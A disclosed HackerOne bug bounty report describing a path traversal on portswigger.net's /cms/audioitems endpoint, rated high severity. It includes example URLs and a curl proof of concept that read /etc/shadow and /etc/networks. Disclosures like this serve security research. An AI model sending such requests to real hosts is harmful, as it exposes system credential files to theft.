# [portswigger.net] Path Traversal al /cms/audioitems

## Report Details
- **Report ID**: 2424815
- **URL**: https://hackerone.com/reports/2424815
- **State**: Closed
- **Severity**: high
- **Submitted**: 2024-03-20T07:26:29.063Z
- **Disclosed**: 2024-04-04T14:51:59.272Z

## Reporter
- **Username**: 0xd0m7
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: portswigger

## Vulnerability Information
Prelude.
I wasn't going to report it, I thought it was your laboratory but after my first analysis this seems real.

**Description**
It's detected a path traversal as root user that allows to remote attackers see internal files as root.

`https://portswigger.net/cms/audioitems//etc/networks`
`https://portswigger.net/cms/audioitems//etc/shadow`


**Poc**
`curl -kis "https://portswigger.net/cms/audioitems//etc/shadow"`
{F3132191}

## Impact

Abilit to read internal files as root

## Attachments
- 2.png
